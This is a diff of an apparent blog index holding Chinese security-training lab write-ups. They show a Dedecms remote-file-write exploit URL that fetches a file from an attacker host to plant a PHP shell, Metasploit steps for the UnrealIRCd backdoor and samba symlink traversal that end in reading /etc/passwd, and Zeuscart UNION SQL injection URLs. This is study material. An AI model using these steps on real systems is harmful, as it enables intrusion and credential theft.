+<h2 id="自己对他的一点理解"><a href="#自己对他的一点理解" class="headerlink" title="自己对他的一点理解"></a>自己对他的一点理解</h2><p>这是一个典型的cms模板的漏洞了，就以我现在的水平（我也才学了半年的信息安全），感觉这种漏洞应该是属于审计出来的，应该是靠src去挖掘，我现在的代码水平不是很好，而且我还是先从OWASP TOP10开始慢慢摸索的渗透，对于这种cms的漏洞不是很懂，因为感觉需要一定的代码水平才能去理解，所以先把源码存下来，后面学了代码再去做一遍注释吧。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($step==<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">require_once(‘../data/admin/config_update.php’);</span><br><span class="line"></span><br><span class="line">$rmurl = $updateHost.”dedecms/demodata.&#123;$s_lang&#125;.txt”;</span><br><span class="line"></span><br><span class="line">echo $rmurl;</span><br><span class="line"></span><br><span class="line">$sql_content = file_get_contents($rmurl);</span><br><span class="line"></span><br><span class="line">$fp = fopen($install_demo_name,’w’);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fwrite($fp,$sql_content))</span><br><span class="line"></span><br><span class="line">echo ‘  &lt;font color=”green”&gt;[√]&lt;<span class="regexp">/font&gt; 存在(您可以选择安装进行体验)’;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">else</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">echo ‘  &lt;font color=”red”&gt;[×]&lt;/</span>font&gt; 远程获取失败’;</span><br><span class="line"></span><br><span class="line">unset($sql_content);</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">exit();</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -3953,27 +3977,27 @@ require(),require_once()
       </tags>
   </entry>
   <entry>
-    <title>铁三训练营之Dedecms远程写文件</title>
-    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<p>CVE-2015-4553 Dedecms远程写文件</p>
+    <title>铁三训练营之Metasploit溢出UnrealIRCd后门漏洞</title>
+    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>Metasploit溢出UnrealIRCd后门漏洞</p>
 <a id="more"></a>
 
-<p>一个看得半懂不懂的漏洞。存住，等以后学了php以后再加深了解。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在目标机上查看【C: /phpstudy /www/data/admin/config update. php<br>】,已经由原来的内容变为空的内容。如图所示<br><img alt="图1" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/1.png" class="lazyload"><br><img alt="图2" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/2.png" class="lazyload"></p>
-<p>在192.168.1.2打开 phpstudy在【c/ phpstudy/www】下建立【dedecms/ demonata. a. txt】,写入【<?php phpinfo():?>】,也可以是一句话。如图所示<br><img alt="图3" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/3.png" class="lazyload"></p>
-<p>访问【http: //192.168.1. 3/install/index. php?<br>step=11&amp;inslockfile=a&amp;s_lang=a&amp;install_demo_nam<br>e=../data/tchg. php&amp;updatehost=http: //192.168.1<br>2/】,可以看到出现了存在,说明 phpinfo已经写进去<br>了。如图所示<br><img alt="图4" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/4.png" class="lazyload"></p>
-<p>访问 【<a href="http://192.168.1.3/data/tchg.php】,可以看到">http://192.168.1.3/data/tchg.php】,可以看到</a> phpinfo页面说明真的写进去了。如图所示<br><img alt="图5" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/5.png" class="lazyload"></p>
-<p>漏洞产生的原因发生在安装页面【c:/ phpstudy/www/install/index. php】,如果接收到的参数【step=11】,然后包含【C: /phpstudy /www/data/admin/config_update. php】。查看【 config_update.php】里面定义了【updateHost】变量。前面已经把这个文件里的内容绐清空了。这里利用了php5.2的特性,全局变量get可以赋值这样就控制了上传的内容,达到了写shel的目的。如图所示<br><img alt="图6" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/6.png" class="lazyload"></p>
-<p>漏洞修复,升级php版本,或者删除安装文件,或者把php.ini文件中的【register_globals】设置为off</p>
-<h2 id="加深理解"><a href="#加深理解" class="headerlink" title="加深理解"></a>加深理解</h2><p>引用大佬博客。写的很清楚。<br><a href="http://blog.sina.com.cn/s/blog_12f7f19600102wimx.html">http://blog.sina.com.cn/s/blog_12f7f19600102wimx.html</a></p>
-<h2 id="自己对他的一点理解"><a href="#自己对他的一点理解" class="headerlink" title="自己对他的一点理解"></a>自己对他的一点理解</h2><p>这是一个典型的cms模板的漏洞了，就以我现在的水平（我也才学了半年的信息安全），感觉这种漏洞应该是属于审计出来的，应该是靠src去挖掘，我现在的代码水平不是很好，而且我还是先从OWASP TOP10开始慢慢摸索的渗透，对于这种cms的漏洞不是很懂，因为感觉需要一定的代码水平才能去理解，所以先把源码存下来，后面学了代码再去做一遍注释吧。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($step==<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">require_once(‘../data/admin/config_update.php’);</span><br><span class="line"></span><br><span class="line">$rmurl = $updateHost.”dedecms/demodata.&#123;$s_lang&#125;.txt”;</span><br><span class="line"></span><br><span class="line">echo $rmurl;</span><br><span class="line"></span><br><span class="line">$sql_content = file_get_contents($rmurl);</span><br><span class="line"></span><br><span class="line">$fp = fopen($install_demo_name,’w’);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fwrite($fp,$sql_content))</span><br><span class="line"></span><br><span class="line">echo ‘  &lt;font color=”green”&gt;[√]&lt;<span class="regexp">/font&gt; 存在(您可以选择安装进行体验)’;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">else</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">echo ‘  &lt;font color=”red”&gt;[×]&lt;/</span>font&gt; 远程获取失败’;</span><br><span class="line"></span><br><span class="line">unset($sql_content);</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">exit();</span><br></pre></td></tr></table></figure>
+<h2 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h2><p><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/1.png" class="lazyload"></p>
+<h2 id="一、利用nmap工具扫描目标主机"><a href="#一、利用nmap工具扫描目标主机" class="headerlink" title="一、利用nmap工具扫描目标主机"></a>一、利用nmap工具扫描目标主机</h2><p>1.1使用nmap命令对目标主机进行扫描。单击桌面空白处,右键菜单选择“在终端中打开”。如图1所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.png" class="lazyload"></p>
+<p>1.2在终端中输入命令”nmap -sV 192.168.1.3”,对目标主机进行端口扫描,发现开放6667端口,对应的服务为unreal ircd。如图2所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/3.png" class="lazyload"></p>
+<p>1.3在终端中输入命令”msfconsole”,启动MSF终端。如图3所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/4.png" class="lazyload"></p>
+<p>1.4在终端中输入命令”search unreal ircd”,搜索ircd的相关工具和攻击载荷。如图4所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/5.png" class="lazyload"></p>
+<p>1.5在终端中输入命令”use exploit/unx/irc/unreal_ircd3281_backdoor”,启用漏洞利用模块,提示符就会提示进入到该路径下。如图5所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/6.png" class="lazyload"></p>
+<p>1.6在终端中输入命令”show options”,查香需要设置的相关项,”yes”表示必须填写的参数。如图6所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/7.png" class="lazyload"></p>
+<p>1.7在终端中输入命令”set RHOST 192.168.1.3”,设置目标主机的IP地址。如图7所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/8.png" class="lazyload"></p>
+<p>1.8在终端中输入”exploit”,开始向目标主机攻击,攻击成功后,建立shell会话。如图8所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/9.png" class="lazyload"></p>
+<p>1.9在终端中输入”whoami”,查看获得的权限为root,输入命令”cat /etc/passwd”,直看系统的帐号和密码。如图9所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/10.png" class="lazyload"></p>
 ]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>奇技淫巧</category>
       </categories>
       <tags>
-        <tag>漏洞复现</tag>
+        <tag>内网渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -3992,6 +4016,33 @@ require(),require_once()
 <p>1.7在终端中输入命令” set RHOST 192.168.1.3”,设置目标主机的P地址。如图7所示<br><img alt="图8" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAsamba%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/8.jpeg" class="lazyload"></p>
 <p>1.8在终端中输入” exploit”,开始向目标主机攻击，攻击成功后，建立会话。如图8所示<br><img alt="图9" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAsamba%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/9.jpeg" class="lazyload"></p>
 <p>1.9在终端中输入” whoami”,查看获得的权限为root，输入命令”ifconfig”，查看系统的网络信息。如图9所示<br><img alt="图10" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAsamba%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/10.jpeg" class="lazyload"></p>
+]]></content>
+      <categories>
+        <category>奇技淫巧</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞</title>
+    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAsysmlink%20%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>Metasploit溢出sysmlink 默认配置目录遍历漏洞</p>
+<a id="more"></a>
+
+<h2 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h2><p>![图1](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/1.jpeg)</p>
+<h2 id="利用nmap工具扫描目标主机"><a href="#利用nmap工具扫描目标主机" class="headerlink" title="利用nmap工具扫描目标主机"></a>利用nmap工具扫描目标主机</h2><p>1.1使用nmap命令对目标主机进行扫描。单击桌面空白处,右键菜单选择“在终端中打开”。如图1所示<br>![图2](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/2.jpeg)</p>
+<p>1.2在终端中输入命令”nmap -sV 192.168.1.3”,对目标主机进行端口扫描,发现开放445端口、139端囗并且安装samba软件,版本为3。如图2所示<br>![图3](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/3.jpeg)</p>
+<p>1.3在终端中输入命令” msfconsole”,启动MSF终端如图3所示<br>![图4](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/4.jpeg)</p>
+<p>1.4在终端中输入命令” search samba”,搜索 samba的相关工具和攻击载荷。如图4所示<br>![图5](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/5.jpeg)</p>
+<p>1.5在终端中输入命令”use auxiliary/admin/smb/samba_symlink_traversal”,启用漏洞利用模块,提示符就会提示进入到该路径下。如图5所示<br>![图6](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/6.jpeg)</p>
+<p>1.6在终端中输入命令”info”,查看需要设置的相关项,”yes”表示必须填写的参数。如图6所示<br>![图7](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/7.jpeg)</p>
+<p>1.7在终端中输入命令” set RHOST 192.168.1.3”,设置目标主机的P地址。如图7所示<br>![图8](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/8.jpeg)</p>
+<p>1.8在终端中输入” set SMBSHARE tmp”,设置SAM可写文件。如图8所示<br>![图9](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/9.jpeg)</p>
+<p>1.9在终端中输入” exploit”,开始攻击。如图9所示<br>![图10](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/10.jpeg)</p>
+<p>1.10新打开一个终端,输入” smbclient //192.168.1.3/tmp”,直接回车,不用输入密码。如图10所示<br>![图11](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/11.jpeg)</p>
+<p>1.11在终端中输入” cd rootfs”,进入 rootfs目录在终端下输入命令”ls”,列出目录(命令无回显)。如图11所示<br>![图12](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/12.jpeg)</p>
+<p>1.12在终端中输入”more /etc/passwd”,查看目标主机系统中的密码。如图12所示<br>![图13](/images/铁三训练营之Metasploit溢出sysmlink 默认配置目录遍历漏洞/13.jpeg)</p>
 ]]></content>
       <categories>
         <category>奇技淫巧</category>
@@ -4024,6 +4075,34 @@ require(),require_once()
       </categories>
       <tags>
         <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>铁三训练营之SQL注入漏洞</title>
+    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>CVE-2015-2183 Zeuscart SQL注入漏洞</p>
+<a id="more"></a>
+
+<p>清明没回家扫墓，也没人带我去玩，也就在这里做一下漏洞复现。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/】。如图1所示<br><img alt="图1" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png" class="lazyload"></p>
+<p>使用账户【 admin】和密码【 admin888】进行登录，如图2所示<br><img alt="图2" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png" class="lazyload"></p>
+<p>访问 【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/do= editcurrency&amp;cid=1】。如图3所示<br><img alt="图3" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png" class="lazyload"></p>
+<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/do= editcurrency&amp;cid=1】,发现页面和前面页面不一样,说明当前页面存在注入。如图4所示<br><img alt="图4" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4.png" class="lazyload"></p>
+<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do= editcurrency&amp;cid=1+ order+by+5+–+】,发现页面正常。如图5所示<br><img alt="图5" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5.png" class="lazyload"></p>
+<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do= editcurrency&amp;cid=1+ order.+by+6+–+】,发现页面和前面页面不一样,说明当前查询了5个字段。如图6所示<br><img alt="图6" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6.png" class="lazyload"></p>
+<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do=editcurrency&amp;cid=1+union+select+1, 2, 3, 4,5+–+】,发现1和3回显了。如图7所示<br><img alt="图7" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7.png" class="lazyload"></p>
+<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do=editcurrency&amp;cid=l+union+select+1, user(),3,version(),5+–+】,直询当前的用户和版本。如图8所示<br><img alt="图8" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8.png" class="lazyload"></p>
+<p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/?do=editcurrency&amp;cid=1+union+select+1, group_concat(schema name),3, 4, 5+from+information schemaschemata+–+】,查询当前的所有数据库。如图9所示<br><img alt="图9" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/9.png" class="lazyload"></p>
+<p>在目标机中打开【 C: \phpstudy\admin\classes\ Core \Settings】下的【 Ccurrencysettings. php】中的第182行,调用了editcurrency会找到 showeditcurrency函数,然后判断是否接收cid参数,如果接收实例化Bin_Query类然后调用里面的 executequery函数执行sq语句。如图10所示<br><img alt="图10" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/10.png" class="lazyload"></p>
+<p>打开【C:\phpstudy\www\bin】下的【 Query. php】中的第49行,可以看到执行Sql语句并没有过滤。如图11所示<br><img alt="图11" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/11.png" class="lazyload"></p>
+<h2 id="加深理解"><a href="#加深理解" class="headerlink" title="加深理解"></a>加深理解</h2><p>SQL注入攻击是黑客对数据库进行攻击的常用手段之一。随着B/S模式应用开发的发展，使用这种模式编写应用程序的程序员也越来越多。但是由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。                  ————引用百度百科</p>
+<h2 id="自己对他的一点理解"><a href="#自己对他的一点理解" class="headerlink" title="自己对他的一点理解"></a>自己对他的一点理解</h2><p>sql注入是我接触信息安全最早的一个漏洞，我相信很多很多人开始学习渗透的时候，应该都是从注入开始的，说说我最早的是怎么理解这个漏洞的吧，我是一个软件工程的学生，我们从大一下册做作品的时候就开始接触到数据库操作语句，增删改查是我们用的最多了，然而这里面用的最多的也就是查，SQL注入漏洞正是网站对传入的参数未进行判断就带入系统查询，所以使得渗透人员可以从此判断出数据库是否存在这一条内容，SQL注入我一开始就是用工具上手的，sqlmap，穿山甲，啊D，明小子，我都用过，其实现在的网站只要不是太旧，大多都会上安全狗，即使你源码存在对参数的未过滤，安全狗也会对你访问网站时的操作进行判断，他会有一套规则来防止你进行SQL注入，当然，上有政策，下有对策，有防护就有绕过，你能摸透他防护的规则也可以用方法绕过，这就涉及到手工注入了，除了在网站网址哪里进行SQL注入，也有别的地方可以进行注入，一般网站源码中一般都会存在条件查询的语句，带有条件查询的地方，就有可能存在注入，例如站内的搜索……<br>在我看来，注入更多的是需要实战和经验。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -4068,85 +4147,6 @@ require(),require_once()
       </categories>
       <tags>
         <tag>思路总结</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>铁三训练营之Metasploit溢出UnrealIRCd后门漏洞</title>
-    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>Metasploit溢出UnrealIRCd后门漏洞</p>
-<a id="more"></a>
-
-<h2 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h2><p><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/1.png" class="lazyload"></p>
-<h2 id="一、利用nmap工具扫描目标主机"><a href="#一、利用nmap工具扫描目标主机" class="headerlink" title="一、利用nmap工具扫描目标主机"></a>一、利用nmap工具扫描目标主机</h2><p>1.1使用nmap命令对目标主机进行扫描。单击桌面空白处,右键菜单选择“在终端中打开”。如图1所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.png" class="lazyload"></p>
-<p>1.2在终端中输入命令”nmap -sV 192.168.1.3”,对目标主机进行端口扫描,发现开放6667端口,对应的服务为unreal ircd。如图2所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/3.png" class="lazyload"></p>
-<p>1.3在终端中输入命令”msfconsole”,启动MSF终端。如图3所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/4.png" class="lazyload"></p>
-<p>1.4在终端中输入命令”search unreal ircd”,搜索ircd的相关工具和攻击载荷。如图4所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/5.png" class="lazyload"></p>
-<p>1.5在终端中输入命令”use exploit/unx/irc/unreal_ircd3281_backdoor”,启用漏洞利用模块,提示符就会提示进入到该路径下。如图5所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/6.png" class="lazyload"></p>
-<p>1.6在终端中输入命令”show options”,查香需要设置的相关项,”yes”表示必须填写的参数。如图6所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/7.png" class="lazyload"></p>
-<p>1.7在终端中输入命令”set RHOST 192.168.1.3”,设置目标主机的IP地址。如图7所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/8.png" class="lazyload"></p>
-<p>1.8在终端中输入”exploit”,开始向目标主机攻击,攻击成功后,建立shell会话。如图8所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/9.png" class="lazyload"></p>
-<p>1.9在终端中输入”whoami”,查看获得的权限为root,输入命令”cat /etc/passwd”,直看系统的帐号和密码。如图9所示<br><img alt data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/10.png" class="lazyload"></p>
-]]></content>
-      <categories>
-        <category>奇技淫巧</category>
-      </categories>
-      <tags>
-        <tag>内网渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>铁三训练营之SQL注入漏洞</title>
-    <url>/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>CVE-2015-2183 Zeuscart SQL注入漏洞</p>
-<a id="more"></a>
-
-<p>清明没回家扫墓，也没人带我去玩，也就在这里做一下漏洞复现。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问【<a href="http://192.168.1.3/">http://192.168.1.3/</a> admin/】。如图1所示<br><img alt="图1" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png" class="lazyload"></p>
-<p>使用账户【 admin】和密码【 admin888】进行登录，如图2所示<br><img alt="图2" data-src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png" class="lazyload"></p>
